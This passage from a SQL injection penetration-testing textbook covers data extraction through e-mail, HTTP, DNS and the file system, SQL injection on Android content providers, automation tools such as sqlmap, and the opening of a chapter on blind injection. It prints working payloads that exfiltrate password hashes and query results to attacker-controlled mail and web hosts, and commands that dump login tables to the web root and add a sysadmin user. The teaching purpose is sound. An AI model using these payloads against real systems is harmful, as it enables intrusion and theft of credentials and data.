‘attachments’ ] as you can see, it’s quite easy to use. so, a possible que ry to inject could be the following: exec master..xp_startmail; exec master..xp_sendmail @recipients = ‘admin@attacker.com’, @query =‘select @@version’ you will receive the e- mail body in a base64 format, which you can easily decode with a tool such as bur p suite. and the use of base64 means you can transfer binary data as well. with xp_sendmail it is even possible to retrieve arbitrary files, by simply specifying them in the @attachment variable. keep in mind, however, that xp_sendmail is enabled by default only for members of the administrative groups. for more information about the xp_sendmail extended procedure, refer to http://msdn.microsoft.com/en -us/library/ms189 505.aspx ; a full description of xp_startmail is available at http://msdn.microsoft.com/en -us/library/ms188392.aspx . if xp_sendmail does not work and your target is sql server 2005 or 200 8, you might still be lucky: starting with sql server 2005 microsoft introduced a new e-mail subsystem that is called database mail. one of its main advantages over sql mail is that because it uses standard smtp, it does not need a mapi client such as outl ook to work. to successfully send e-mails, at least one database mail profile must exist, which is simply a collection of database mail accounts. moreover, the user must be a member of the group databasemailuserrole , and have access to at least one databas e mail profile. to start database mail, it is enough to use sp_configure , while to actually send an e- mail you need to use sp_send_dbmail , which is the database mail equivalent of xp_sendmail for sql mail. its syntax, together with the most important parameters, is as follows: sp_send_dbmail [ [ @profile_name = ] ‘profile_name’ ][, [ @recipients = ] ‘recipients [; ...n ]’ ] [, [ @subject = ] ‘subject’ ] [, [ @body = ] ‘body’ ] [, [ @file_attachments = ] ‘attachment [; ...n ]’ ] [, [ @query = ] ‘query’ ] [, [ @execute_query_database = ] ‘execute_query_database’ ] the profile_name indicates the profile to use to send the e -mail; if it’s left blank the default public profile for the msdb database will be used. if a profile does not exist, you can create one using the following procedure: 1. create a database mail account using msdb..sysmail_add_account_sp. you will need to know a valid smtp server that the remote database can contact and through which t he email can be sent. this smtp server can be some server on the internet, or one that is under the control of the attacker. however, if the database server can contact an arbitrary ip address on port 25, there are much faster ways to extract the data (e. g. using openrowset on port 25, as i will show you in a following section) than using e -mail. therefore, if you need to use this technique it’s very likely that the database server cannot access external hosts, and so you will need to know the ip address of a valid smtp server that resides on the target network. this may not be as hard as it sounds: if the web application has some functionality that sends e -mail messages (e.g. with the results of some action of the user, or an e- mail to reset a user’s passw ord), it’s very likely that an smtp server will appear in the e-mail headers. alternatively, sending an e- mail to a non- existent recipient might trigger a response that contains the same information. however, this might not be enough if the smtp server is authenticated: if this is the case, you will need a valid username and password to successfully create the database mail account. 2. create a database mail profile, using msdb..sysmail_add_profile_sp. 3. add the account that you created in step 1 to the pr ofile that you created in step 2, using msdb..sysmail_add_profileaccount_sp. 4. grant access to the profile that you created to the users in the msdb database, using msdb..sysmail_add_principalprofile_sp. the process, complete with examples, is described i n detail at http://msdn.microsoft.com/en us/library/ms187605(sql.90).aspx . if everything works and you have a valid database mail account, you can finally run queries and have their results sent in an e -mail. here is an example of the whole process: --enable database mail exec sp_configure ‘show advanced’, 1; reconfigure; exec sp_configure ‘database mail xps’, 1; reconfigure --create a new account, myacc. the smtp server is provided in this call. exec msdb.dbo.sysmail_add_account_sp@account_name=‘myacc’,@email_address=‘hacked@victim.com’, @display_name=‘mls’,@mailserver_name=‘smtp.victim.com’, @account_id=null; --create a new profile, myprofile exec msdb.dbo.sysmail_add_profile_sp@profile_name=‘myprofile’,@description=null, @profile_id=null; --bind the account to the profile exec msdb.dbo.sysmail_add_profileaccount_sp @profile_name=‘myprofile’,@account_name=‘acc’,@sequence_number=1 --retrieve log in declare @b varchar(8000); select @b=system_user; --send the mail exec msdb.dbo.sp_send_dbmail @profile_name=‘myprofile’,@recipients=‘allyrbase@attacker.com’, @subject=‘system user’,@body=@b; oracle when it comes to using the database server to send e- mail messages, oracle also provides two different e -mailing systems depending on the database server version. from version 8i, you could send e -mails through the utl_smtp package, which provided the dba with all the instruments to start and manage an smtp connection. starting with version 10g, oracle introduced the utl_mail package, which is an extra layer over utl_smtp and allows administrators to use e -mailing in a faster and simpler way. utl_smtp, as t he name suggests, provides a series of functions to start and manage an smtp connection: you contact a server using utl_smtp.open_connection , then send the “helo” message to that server using utl_smtp.helo , and then specify the sender and receiver using ut l_smtp.mail and utl_smtp.rcp , respectively. then you can specify the message with utl_smtp.data and finally terminate the session using utl_smtp.quit . with utl_mail, the whole process is a lot simpler, as you can perform it in its entirety with the following stored procedure: utl_mail.send(sender, recipient, cc, bcc, subject, message, mime_type,priority) keep in mind that for obvious security reasons utl_mail is not enabled by default; an administrator must enable it manually. utl_smtp is, however, enabled by default and granted to the public role. http/dns oracle also offers two possibilities for performing http requests: utl_http and httpuri_type. the utl_http package and the httpuri_type object type are granted to the public role by default and can be exe cuted by any user in the database as well as via sql injection. to send, for example, the password hash of the sys user to a remote system, you can inject the following string: or 1=utl_http.request (‘http://www.or asploit.com/’||(select password from dba_users where rownum=1)) -- via the httpuri_type object type as follows: or 1=httpuri_type(‘http://www.orasploit.com/’||(select password from dba_users where rownum=1)).getclob() -- additionally, if the sql query is written inside the url, the data (maximum 64 bytes) can also be sent via the domain name system (dns) lookup that is made to an external site as follows (we discuss this technique in more detail in chapter 5 .): or 1= utl_http.request (‘http://www.‘||(selectpasswordfromdba_userswhererownum=1)||’.orasploit.com/’) -- file system sometimes the web server and the database server happen to reside on the same box. this is a common case w hen the web application has a limited number of users and/or it uses a limited amount of data. in such cases, it might not be very cost -effective to split the architecture into multiple tiers. although such a choice is obviously very attractive for an orga nization that tries to minimize expenses, it has a number of security drawbacks, most notably the fact that a single flaw can be enough for an attacker to obtain full control over all the components. in case an sql injection flaw is discovered, such a setu p allows an easy and convenient way to extract information from the database server: if the attacker has enough privileges to write on the file system, he can redirect the results of a query to a file inside the web server root, and then normally access th e file with the browser. if the database server and the web server are on separate machines, it might still be possible to adopt this technique if the web server is configured to export the folders that contain the web site, and the database server is auth orized to write on them. note that additional information on interacting with the file system is available in chapter 6 . sql server with microsoft sql server there are various ways to redirect information to the file s ystem, if your user has the privileges to do so, and the best one depends on the type and amount of data you are dealing with. sometimes you might need to export a simple line of text, such as the value of a built -in variable like @@version . this is also the case if you extract data from the database into a single text value, such as the variable @hash in the following code on sql server 2005, which retrieves the username and hash of the first user in the sql_logins table: declare @hash nvarchar(1000) select top 1 @hash = name + ‘ | ’ +master.dbo.fn_varbintohexstr(password_hash) from sys.sql_logins in such a case, it is fairly easy to redirect this value to a text file on the filesystem, by injecting the following code: -- declare needed variables declare @a int, @hash nvarchar(100), @fileid int; -- take the username and password hash of the first user in sql_logins -- and store it into the variable @hash select top 1 @hash = name + ‘ | ’ +master.dbo.fn_varbintohexstr(password_hash) from sys.sql_logins; -- create a filesystemobject pointing to the location of the desired file exec sp_oacreate ‘scripting.filesystemobject’, @a out; exec sp_oamethod @a, ‘opentextfile’, @fileid out,‘c:\\ inetpub\\ wwwroot\\ hash.txt’, 8, 1; -- write the @hash variable into that file exec sp_oamethod @fileid, ‘writeline’, null, @hash; -- destroy the objects that are not needed anymore exec sp_oadestroy @fileid; exec sp_oadestroy @a; now, all you need to do is to point your browser to the file location and retrieve the information, as shown in figure 4.16. figure 4.16 using the server’s file system to obtain the password hash of user sa if you need to repeat the process several times, you can make things easier by encapsulating the code in a stored procedure that can be called at will. this technique works quite well for extracting small amounts of information, but what about extracting whole tables? the best option in that case is to rely on bcp.exe, a command- line utility shipped by default with sql server. as stated on msdn, “the bcp utility bulk copies data between an instance of microsoft sql server and a data file in a user -specified format” (see http://msdn.microsoft.com/en -us/library/ms162802.aspx ). bcp.exe is a powerful utility which accepts a large number of parameters. in our case, however, we are interested in only a few of them, so here’s an example that retrieves the entire sql_logins table: exec xp_cmdshell ‘bcp “select ∗ from sys.sql_logins” queryout c:\\ inetpub\\wwwroot\\ hashes.txt -t -c’ what happens here? because bcp is a command -line utility, you can only call it with xp_cmdshell (or with an equivalent method you might have created; see chapter 6 ). the first parameter that is passed to bcp is the query, which can be any t -sql that returns a result set. the queryout parameter is used to provide maximum flexibility, because it can handle bulk copying of data. then you specify the output file, which is the file where the data must be written and which must reside where it can be accessed with an http connection in this exploit scenario. the − c switch indicates that a character data type must be used. if you need to transfer binary data, you should use the − n switch instead . the −t switch deserves a deeper explanation. because bcp.exe is a command -line utility that needs to talk with a running installation of sql server, it will need to provide some form of authentication to perform its job. usually, such authentication is performed with a username and password using the − u and − p parameters, but during a real attack you might not know (yet) such pieces of information. by using the − t switch, you tell bcp to connect to sql server with a trusted connection using windows integr ated security. that is, the credentials of the user executing the queries will be used. if everything goes according to plan, the entire sql_logins table will be copied into hashes.txt, ready to be accessed with your browser, as shown in figure 4.17 . figure 4.17 extracting an entire database table to the file system in case trusted connections do not work, and you do not know the password of any user, you can simply add a temporary user with sp_adduser , give it the password you want, make the user a member of the sysadmin group with sp_addsrvrolemember , and finally call bcp using the user you just created and its password with − u and − p. this is a method that is more invasive and leaves a larger footprint, but kept in mind if the trusted connection fails for some reason. mysql on mysql, you can send the results of a select statement into a file by appending to the query the string into outfile . by default, the file is written in the database directory, whose value on mysql 5 is stored in the @@datadir variable. however, you can specify an arbitrary path, and the results of the query will be successfully saved as long as mysql has the necessary privileges to write in that directory. to be able to perform this action, however, your user needs to have file privileges. to find out whether your user has such privileges you can use one of the following two queries: select file_priv from mysql.user where user = ‘username’ --- mysql 4/5 select grantee,is_grantable from information_schema.user_privileges where privilege_type = ‘file’ and grantee = ‘username’ assumi ng that you have such privileges, if you know that the web site root directory is /webroot/ and your mysql user has write access to that directory, you could inject the following query: select table_name from information_schema.tables into outfile‘/webroot/tables.txt’; then, by pointing your browser to http://www.victim.com/tables.txt you would immediately retrieve the results of your query. although into outfile is well suited to extract text data, it can cr eate problems in cases of binary data, because it will escape several characters. if you need a precise copy of some binary data that you intend to extract, you can simply use into dumpfile instead. oracle in oracle, most of the methods for accessing files (utl_file, dbms_lob, external tables, and java) require pl/sql. we will cover these methods in detail in chapter 6 . sql injection on mobile devices so far we have discussed sql injection attacks against web applicatio ns, and historically this is where many sql injection vulnerabilities have been found. however, as technologies have changed this kind of vulnerability has started to pop up in some fairly unexpected places, such as on mobile devices. if you thought that s ql code was only running on databases deployed on big servers, think again: lots of mobile phones and other embedded devices have sql code being extensively used under the hood. such code is mostly used to organize and manage small data repositories like c ontacts, bookmarks, e -mails, or text messages. obviously, considering the limited resources available on a mobile device in terms of memory and cpu, the database server running such code needs to be a lot more lightweight compared to behemoths like sql ser ver or oracle, and in most cases the choice is sqlite, an implementation of a relational database written in c that is currently shipped as a library smaller than 300kb! being a library, it does not need to run as a separate process, it is simply linked to the program that needs it, and its code is accessed via function calls, reducing the overhead to a minimum. we will have a brief look at how sql injection can be found in android- based devices, more specifically in content providers, a type of inter proce ss communication (ipc) endpoint used to provide data to applications via a content resolver. as you will see, things are very similar to what we have seen so far in terms of exploitation techniques. the only notable difference is that talking to a content provider (or any other sqlite instance in an embedded device) is a bit different from talking to a database server via a web application using a browser, and might need a bit of extra coding beforehand. keep in mind that in order to play with android- based devices, you don’t have to risk messing up your phone or tablet: you can simply emulate a device, and the preferred version of android, on your pc. nils from mwr infosecurity first presented this research at black hat abu dhabi in 2010, and you can find m ore information at the addresses https://media.blackhat.com/bh -ad10/nils/black -hat-ad-2010- android- sandcastle- wp.pdf and http://labs.mwrinfosecurity.com/notices/webcontentresolver/. in order to look for sql injection vulnerabilities on an android device we first need to install the webcontentresolver application on it. this applicat ion allows us to talk to the content provider using a normal http client such as our web browser (and, by extension, lots of tools specifically targeted to sql injection). you can download the tool, and its source code, at http://labs.mwrinfosecurity.com/tools/android_webcontentresolver/ . once you have installed and started the tool, you need to start the adb server , which is shipped with the android sdk: psilocybe platform -tools# ./adb devices * daemon not running. starting it now on port 5037 ∗ * daemon started successfully ∗ list of devices attached emulator- 5554 device good: it looks like we can successfully communicate with our device. remember that if you are using a physical device you will have to turn usb debugging on in order to have a successful communication. now we can set up a port forward from a port on our computer to the port on the device where webcontentresolver is listening (8080 by default): psilocybe platform -tools# ./adb forward tcp:8080 tcp:8080 then we only need to point our web browser to http://127.0.0.1:8080 and start having fun. we start with a list of all content providers, with names and permission, requesting the url http://127.0.0.1:8080/list : package: com.android.browser authority: com.android.browser;browser exported: true readperm: com.android.browser.permission.read_history_bookmarks writeperm: com.android.browser.permission.write_history_bookmarks pathperm0: /bookmarks/search_suggest_query readperm0: android.permission.global_search writeperm0: null --------------------------------------------- package: com.android.browser authority: com.android.browser.home exported: false readperm: com.android.browser.permission.read_history_bookmarks writeperm: null --------------------------------------------- package: com.android.browser authority: com.android.browser.snapshots exported: false readperm: null writeperm: null --------------------------------------------- package: com.android.calendar authority: com.android.calendar.calendarrecentsuggestionsprovider exported: true readperm: null writeperm: null --------------------------------------------- package: com.android.deskclock authority: com.android.deskclock exported: false readperm: null writeperm: null <snip> each of these can be easily tested for vulnerabilities using the techniques and tools detailed in this book, but for simplicity (and to avoid the irresponsible disclosure of new vulnerabilities) we will follow nils’ example with the ‘settings’ provider. we will use the query method of webcontentresolver whose syntax is explained at the page http://127.0.0.1:8080/query : queries a content provider and prints the content of the returned cursor.the query method looks as follows: query (uri uri, string[] projection, string selection, string[] selectionargs, string sortorder) following parameters are supported: a: defines the authority to query (required) path0..n: elements of the path. will be used to construct the uri as follows: content://a/path0/path1/../pathn project0..n: elements in the projection array selection: the selection argument.selectionname, selectionid: both need to be provided. will be used to build a selection as follows selectionname+‘=’+selectionid. will be used if no selection parameter is given.arg0..n: elements of the selectionargs array sortorder: the sortorder argument we therefore view the contents of the setting table with the url, http://localhost:8080/query?a=settings& path0=system which returns the following (for clarity, column alignment has been modified): query successful: column count: 3 row count: 51 | _id | name | value | 1 | volume_music | 11 | 4 | volume_voice | 4 | 5 | volume_alarm | 6 | 6 | volume_notification | 5 | 7 | volume_bluetooth_sco | 7 <snip> adding the selid parameter to the url (http://127.0.0.1:8080/query?a=settings&path0=system&selname=_id&selid=1 ) we can reduce the output to a single row: query successful: column count: 3 row count: 1 | _id | name | value | 1 | volume_music | 11 now we simply add a single quote after the selid parameter and we obtain the following error message: exception: android.database.sqlite.sqliteexception: unrecognized token: “’)”:, while compiling: select ∗ from system where (_id=1’ ) unrecognized token: “’) ”:, while compiling: select ∗ from system where (_id=1’ ) wow! looks fantastically similar to all other sql er ror messages that have helped us so far, which means that from now on the attack is really a piece of cake. for instance, we can use the traditional union -based attack to dump some content from the sqlite_master table, by entering the following url: http://127.0.0.1:8080/query?a=settings&path0=system&selname=_id&selid=1)+union+select+name,t ype,null+from+sqlite_master-- the result is the following: query successful: column count: 3 row count: 13 | _id | name | value | 1 | volume_music | 11 | android_metadata | table | null | bluetooth_devices | table | null | bookmarks | table | null | bookmarksindex1 | index | null | bookmarksindex2 | index | null | secure | table | null | secureindex1 | index | null | sqlite_autoindex_secure_1 | index | null | sqlite_autoindex_system_1 | index | null | sqlite_sequence | table | null | system | table | null | systemindex1 | index | null as we can see, things look familiar again and we can easily apply the same techniques and tools used elsewhere in the book. what does it mean from a threat analysis perspective? it means that other applications that can access that content provider might r un a sql injection attack and access the sqlite tables that specify the settings of your phone in an unauthorized way. instead of having a client attacking a remote web application (as in all our previous examples), we would have a malicious application on your phone attacking the phone itself (and/or other applications on it). a more advanced scenario, including obtaining data from a user’s device via client side sql injection is discussed in chapter 7 . this is an exam ple for android, but it can be easily generalized: anywhere sql is used there is the potential for some sql injection vulnerabilities, no matter where this sql code happens to be run. the only additional challenge with mobile and other embedded devices is that there might be custom coding needed in order to talk with sqlite (or whatever other db technology is used) and pass custom parameters. however, once you have bridged that gap, attacking that small app on your phone will not be different from attacking the servers we have seen previously. automating sql injection exploitation in the previous sections, you saw a number of different attacks and techniques that you can use once you have found a vulnerable application. however, you might have noticed that m ost of these attacks require a large number of requests to extract a decent amount of information from the remote database. depending on the situation, you might require dozens of requests to properly fingerprint the remote database server, and maybe hundr eds (or even thousands) to retrieve all the data you are interested in. manually crafting such a vast number of requests would be extremely tedious, but fear not: several tools can automate the whole process, allowing you to relax while watching the tables being populated on your screen. sqlmap sqlmap is an open source command- line automatic sql injection tool that is released under the terms of the gnu gplv2 license by bernardo damele a.g. and miroslav stampar. it can be downloaded at http://sqlmap.sourceforge.net . at the time of this writing, it is probably the sql injection tool “par excellence,” thanks to its impressive list of features and very active mailing list. it will be able to help you in pretty much all situations, as it supports the following db technologies: • microsoft sql server • microsoft access • oracle • mysql • postgresql • sqlite • firebird • sybase • sap maxdb sqlmap is not only an exploitation tool, but can also assist you in finding vulne rable injection points. once it detects one or more sql injections on the target host, you can choose (depending on the situation and the privileges) among a variety of options: • perform an extensive back -end database server fingerprint. • retrieve the database server session user and database. • enumerate users, password hashes, privileges, and databases. • dump the entire database server table/columns or the user’s specific database server table/columns, using various techniques to optimize the extraction and reduce the time needed for the attack. • run custom sql statements. • read arbitrary files. • run commands at the operating system level. sqlmap is developed in python, which makes the tool independent of the underlying operating system as it only requires the python interpreter version equal to or later than 2.4. sqlmap also implements various technique s to exploit a sql injection vulnerability: • union query sql injection, both when the application returns all rows in a single response and when it returns only one row at a time. • stacked query support. • inferential sql injection. for each http respons e, by making a comparison based on html page content hashes, or string matches, with the original request, the tool determines the output value of the statement character by character. the bisection algorithm implemented in sqlmap to perform this technique can fetch each output character with, at most, seven http requests. this is sqlmap’s default sql injection technique. as its input, sqlmap accepts a single target url, a list of targets from the log files of burp or webscarab, or a “google dork” which que ries the google search engine and parses its results page. there is even a sqlmap plugin for burp available at the address http://code.google.com/p/gason/ . sqlmap can automatically test all the provided get /post parameters, the http cookies, and the http user -agent header values; alternatively, you can override this behavior and specify the parameters that need to be tested. sqlmap also supports multithreading to speed up blind sql injection algorithms; it estimates the time needed to complete an attack depending on the speed of performed requests, and allows you to save the current session and retrieve it later. it also integrates with other security -related open source projects, such as metasploit and w3af. it can even be used to directly connect to a database and perform the attack without a web application in between (as long as the credentials to the database are available, of course). keep in mind that this is just a very brief overview of the sqlmap’s num erous features, as illustrating all possible options and possibilities would require several pages, and would not add much to the tool’s extensive documentation, which you can find at the address http://sqlmap.sourceforge.net/doc/readme.html . bobcat bobcat is an automated sql injection tool that is designed to aid a security consultant in taking full advantage of sql injection vulnerabilities; you can download it at http://www.northern- monkee.co.uk/pub/bobcat.html . it was originally created to extend the capabilities of a tool by cesar cerrudo, called data thief. bobcat has numerous features that will aid in the compromise of a vulne rable application and help exploit the database server, such as listing linked servers and database schemas, dumping data, brute -forcing accounts, elevating privileges, and executing operating system commands. bobcat can exploit sql injection vulnerabiliti es in web applications, independent of their language, but is dependent on sql server as the back -end database. it also requires a local installation of microsoft sql server or microsoft sql server desktop engine (msde). the tool also uses the error -based method for exploiting sql injection vulnerabilities, so if the remote database server is protected by sufficient egress filtering, exploitation is still possible. according to the author, the next version will include extended support for other databases and new features (such as the ability to exploit blind injections) and will also be open source. the most useful and unique feature of bobcat is its ability to exploit the database server through the use of an oob channel. bobcat implements the “openrowset” style of oob channel as introduced by chris anley in 2002 (see www.nextgenss.com/papers/more_advanced_sql_injection.pdf ); hence, it’s a requirement for a local microsoft sql s erver or msde installation. we explain oob connections using openrowset in more detail in chapter 5 . figure 4.18 shows a screenshot of the tool. figure 4.18 screenshot of bobcat bsql another very interesting tool for windows boxes is bsql, developed by ferruh mavituna and available at http://code.google.com/p/bsqlhacker/ . even though its development appears to have been discontinued in favor of netsparker (a commercial product), it performed extremely well according to the owasp sqlibench project, a benchm arking project of automatic sql injectors that perform data extraction ( http://code.google.com/p/sqlibench/ ), and therefore deserves mention. bsql is released under the gplv2, works on any windows machine with .net framework 2 installed, and comes with an automated installer. it supports error -based injection and blind injection and offers the possibility of using an interesting alternative approach to time -based injection, where different timeouts are use d depending on the value of the character to extract so that more than 1 bit can be extracted with each request. the technique, which the author dubbed “deep blind injection,” is described in detail in a paper that you can download from http://labs.portcullis.co.uk/download/deep_blind_sql_injection.pdf . bsql can find sql injection vulnerabilities and extract information from the following databases: • oracle • sql server • my sql figure 4.19 shows an example screenshot of an ongoing bsql attack. figure 4.19 bsql during an active session bsql is multithreaded and is very easy to configure, thanks to a wizard that you can start by clicking the injection wizard button on the main window. the wizard will ask you to enter the target url and the parameters to include in the request, and then wi ll perform a series of tests, looking for vulnerabilities in the parameters that have been marked for testing. if a vulnerable parameter is found, you will be informed, and the actual extraction attack will start. by clicking the extracted database tab, yo u can see the data as it is being extracted, as shown in figure 4.20. figure 4.20 bsql extracting the tables and columns of the remote database other tools you’ve been given a brief overview of some tools that can assist you in performing an efficient data extraction, but keep in mind that several other tools out there can do a very good job too. among the most popular are the following: • fg-injection framework ( http://sourceforge.net/projects/injection -fwk/) • havij ( http://itsecteam.com/en/projects/project1.htm) • sqlinjector ( http://www.woanware.co.uk/?page_id=19) • sqlget ( www.infobytecom.ar ) • sqlsus ( http://sqlsus.sourceforge.net/ ) • pangolin ( http://www.nosec -inc.com/en/products/pangolin/ ) • absinthe ( http://0x90.org/releases/absinthe/) summary in this chapter, a set of techniques that are aimed at transforming a vulnerability into a fully fledged attack were illustrated. the first and simplest form of exploitation uses union statements to extract data by appending to the results returned by the original query. union statements allow the attacker to extract a vast amount of information in a very fast and reliable way, making this technique a powerful weapon in your arsenal. in case union -based attacks aren’t a viable option, you can still extract data by using conditional statements that trigger a different response from the database depending on the value of a certain bit of information. we explored a number of different variants of this technique, as such responses can be different in terms of time needed to complete, in terms of success or failure, or in terms of contents of the returned page. we also discussed how it is possible to transfer data by starting a completely diffe rent connection from the database server to the attacker’s machine, and how it is possible to rely on various protocols for this task, such as http, smtp, or database connections. you can use all of these techniques, separately or in combination, to extrac t large amounts of data, starting from the enumeration of the database schema and then moving to the tables that you are most interested in. in case the user has only limited access on the remote database, you can try to expand your influence by escalating your privileges, either by exploiting some vulnerability that has been left unpatched or by abusing specific functionality of the database. when these privileges have been obtained, the database password hashes become a very attractive target, as they can be cracked and used to propagate the attack to other areas of the target network. solutions fast track understanding common exploit techniques • it is common for sql injection vulnerabilities to occur in select statements, which do not modify data. sql in jection does also occur in statements that modify data such as insert , update , and delete, and although the same techniques will work care should be taken to consider what this might do to the database. if possible, use an sql injection on a select stateme nt. if not possible, some techniques can be used to reduce the danger of modification of data during the attack. • it is very useful to have a local installation of the same database you are exploiting to test injection syntax. • if the back -end database and application architecture support chaining multiple statements together, exploitation will be significantly easier. identifying the database • the first step in a successful attack should always consist of accurately fingerprinting the remote database se rver. • the most straightforward way consists of forcing the remote application to return a message (very often an error message) that reveals the database server technology. • if that is not possible, the trick is to inject a query that works on only a specific database server. extracting data through union statements • to successfully append data to an existing query, the number of columns and their data type must match. • the value null is accepted for all data types, whereas group by is the quickest way to find the exact number of columns to inject. • if the remote web application returns only the first row, remove the original row by adding a condition that always returns fal se, and then start extracting your rows one at a time. using conditional statements • conditional statements allow the attacker to extract one bit of data for every request. • depending on the value of the bit you are extracting, you can introduce a delay, generate an error, or force the application to return a different html page. • each technique is best suited for specific scenarios. delay -based techniques are slow but very flexible, whereas content -based techniques leave a slightly smaller footprint com pared to error- based ones. enumerating the database schema • follow a hierarchical approach: start enumerating the databases, then the tables of each database, then the columns of each table, and then finally the data of each column. • if the remote database is huge, you might not need to extract it in its entirety; a quick look at the table names is usually enough to spot where the interesting data is. injecting into insert queries • if exploiting sql injection in insert, update, or delete queries, care must be taken to avoid side effects such as filling the database with garbage, or mass alteration or deletion of content. • approaches for safely injecting include modifying insert or update queries to update a value that can be viewed elsewhere in the appli cation, or to modify an insert, update, or delete query so that the overall query fails, but either returns data or produces a noticeable difference to the user, such as a time delay or difference in error messages. escalating privileges • all major databa se servers have suffered from privilege escalation vulnerabilities in the past. the one you are attacking might not have been updated with the latest security fixes. • in other cases, it may be possible to attempt to brute -force the administrative account; for instance, using openrowset on sql server. stealing the password hashes • if you have administrative privileges, do not miss the chance to grab the password hashes. people tend to reuse their passwords and those hashes could be the keys to the kingdom. out-of-band communication • if it’s not possible to extract data using the previous methods, try establishing a completely different channel. • possible choices include e- mail (smtp), http, dns, file system, or database -specific connections. sql injection on mobile devices • many mobile and embedded devices uses local sql databases to store or cache information. • although the method of accessing these is different, these mobile applications are exploitable via sql injection in the right conditions, just l ike any web application. automating sql injection exploitation • the majority of the attacks analyzed in this chapter require a high number of requests to reach their goal. • luckily, several free tools can assist in automating the attack. • these tools provide a plethora of different attack modes and options, ranging from the fingerprint of the remote database server to the extraction of the data it contains. frequently asked questions q: is it necessary to always start the attack by fingerpr inting the database? a: yes. detailed knowledge of the technology used by the target database server will allow you to fine -tune a successful attack, resulting in a much more effective attack. always invest some time in the fingerprint phase; it will save you a lot of time later. q: should i use union -based techniques when possible? a: yes, as they allow you to extract a reasonable amount of information with each request. q: what if the database is too big to enumerate all tables and columns? a: try enumerating tables and columns whose names match certain patterns. adding further conditions such as like %password% or like %private% to your queries can help you to direct your effort toward the most interesting data. q: how can i avoid data leakage through oob connections? a: making sure your applications properly sanitize user input is the first and most important line of defense. however, always make sure your database servers are not authorized to transmit data outside the network. do not allow them to send smtp traffic to the outside, and configure your firewalls so that all potentially dangerous traffic is filtered. q: how easy is it to crack the password hashes, once i have retrieved them? a: it depends on a number of factors. if the hashing algorithm is weak retrieving the original password is very easy. if the hashes have been generated with a cryptographically strong algorithm, it depends on the strength of the original password. however, unless a password complexity policy was enforced, chances are that at least some of the hashes will be cracked. chapter 5 blind sql injection exploitation marco slaviero solutions in this chapter: • finding and confirming blind sql injection • using time -based techniques • using response -based techniques • using alternative channels • automating blind sql injection exploitation introduction so you’ve found a sql injection point, but the application just gives you a generic error page? or perhaps it gives you the page as normal, but there is a small difference in what you get back, visible or not? these are examples of blind sql injection—wher e we exploit without any of the useful error messages or feedbacks that we saw in chapter 4 . don’t worry though — you can still reliably exploit sql injection even in these scenarios. we saw a number of classic sql injection examples in chapter 4 that rely on verbose error messages to extract data as this was the first widely used attack technique for data extraction for these vulnerabilities. before sql injection was well understood, developers were advised to disable all verbose error messages in the mistaken belief that without error messages the attacker’s data retrieval goal was next to impossible. in some cases developers would trap errors within the application and display gener ic error messages while in other cases no errors would be shown to the user. however, attackers soon realized that even though the error -based channel was no longer available, the root cause still remained: attacker -supplied sql was executing within a data base query. figuring out new channels was left to the ingenuity of the attackers and a number of channels were discovered and published. along the way the term blind sql injection entered into common usage with slight differences in the definition used by each author. chris anley first introduced a blind sql injection technique in a 2002 paper that demonstrated how disabling verbose error messages could still lead to injection attacks and he provided several examples. maor and shulman’s definition required that verbose errors be disabled but that broken sql syntax would yield a generic error page, and implicitly assumed that the vulnerable statement was a select query whose result set was ultimately displayed to the user. the query’s result (either success o r failure) was then used to first derive the vulnerable statement after which data was extracted through a union select. kevin spett’s definition was similar in that verbose error messages were disabled and injection occurred in a select statement; however instead of relying on generic error pages his technique altered content within the page through sql logic manipulations to infer data on a byte-by-byte basis which was identical to hotchkies’ usage. it is clear that blind sql injection has received signif icant attention from attackers and its techniques are a key component in any sql injection arsenal, however before delving into the specifics let us first define blind sql injection and explore the scenarios in which it commonly occurs. in this chapter we cover techniques for extracting information from the backend database through the use of inference and alternative channels —including time delays, errors, dns, and html responses. this gives us a flexible set of ways to communicate with the database, even in situations where the application is catching exceptions properly and we do not have any feedback from the web interface that our exploits are working. note in this book, blind sql injection refers to those attack techniques that exploit a database query input sanitization vulnerability to extract information from the database or extract information about the database query, without the use of verbose database error messages or in -band data concatenation. this definition is intentionally broad as it makes no assumptions about the specific sql injection point (except that sql injection must be possible), does not require a particular server or application behavior and does not demand specific techniques (apart from excluding error -based data extraction and the concatenation of data onto legitimate results, for instance through a union select). the techniques used for extracting information will be quite varied with our sole guiding principle being the absence of the two classic extraction techniques. keep in mind that blind sql injection is mostly used to extract data from a database, but can also be used to derive the structure of the query into which we are injecting sql. if the full query is worked out (including all relevant columns and their types), in -band data concatenation generally becomes quite easy so attackers will strive to determine the query structure before turning to more esoteric blind sql injection techniques. finding and confirming blind sql injection in order to exploit a blind sql injecti on vulnerability we must first locate a potentially vulnerable point in the target application and verify that sql injection is possible. this has already been extensively covered in chapter 2 , but it is worth reviewin g the main techniques used when testing for blind sql injection specifically. forcing generic errors applications will often replace database errors with a generic error page, but even the presence of an error page can allow you to infer whether sql inject ion is possible. the simplest example is the inclusion of a single quote in a piece of data that is submitted to the web application. if the application produces a generic error page only when the single quote or a variant thereof is submitted, then a reas onable chance of attack success is possible. of course, there are other reasons that a single quote would cause the application to fail (for example, where an application defense mechanism limits the input of single quotes), but by and large the most commo n source of errors when a single quote is submitted is a broken sql query. injecting queries with side effects stepping towards confirmation of the vulnerability, it is generally possible to submit queries that have side effects observable by the attacker. the oldest technique uses a timing attack to confirm that execution of the attacker’s sql has occurred, and it is also sometimes possible to execute operating system commands whose output is observed by the attacker. for example, in a microsoft sql server it is possible to generate a 5 -s pause with the sql snippet: waitfor delay ‘0:0:5’ likewise, mysql users could use the sleep() function which performs the same task in mysql 5.0.12 and upwards, or the postgresql pg_sleep() function from version 8.2 onwards. finally, the observed output can also be in- channel; for instance if the injected string: ‘ and ‘1’=’2 is inserted into a search field and produces a different response from: ‘ or ‘1’=’1 then sql injection appears very likely. the first string introduce s an always false clause into the search query which will return nothing, while the second string ensures that the search query matches every row. this was covered in more detail in chapter 2 . splitting and balancing where generic errors or side effects are not useful, we can also try the “parameter splitting and balancing” technique as named by david litchfield, and a staple of many blind sql injection exploits. splitting occurs when the legitimate input is broken up, and balancing ensures that the resulting query does not have trailing single quotes that are unbalanced. the basic idea is to gather legitimate request parameters and then modify them with sql keywords so that they are different from the original data although functionally equivalent when parsed by the database. by way of example, imagine that in the url www.victim.com/view_review.aspx?id=5 the value of the id parameter is inserted into a sql statement to form the following query: select review_content, review_author from reviews where id=5 by substituting 2 + 3 in place of 5, the input to the application is different from the original request, but the sql is functionally equivalent: select review_ content, review_author from reviews where id=2+3 this is not limited to numeric data. assume that the url www.victim.com/count_reviews.jsp?author=madbob returns information relating to a particular database entry, where the value of the author parameter is 